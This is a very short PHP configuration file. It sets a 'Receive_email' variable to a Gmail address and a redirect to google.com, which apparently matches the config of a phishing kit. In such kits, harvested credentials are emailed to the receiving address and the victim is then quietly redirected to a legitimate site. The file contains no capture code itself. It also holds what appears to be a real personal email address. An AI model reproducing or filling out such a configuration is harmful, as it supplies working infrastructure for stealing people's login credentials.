<?php 
$Receive_email="brayanjulius5566@gmail.com";
$redirect="https://www.google.com/";
?>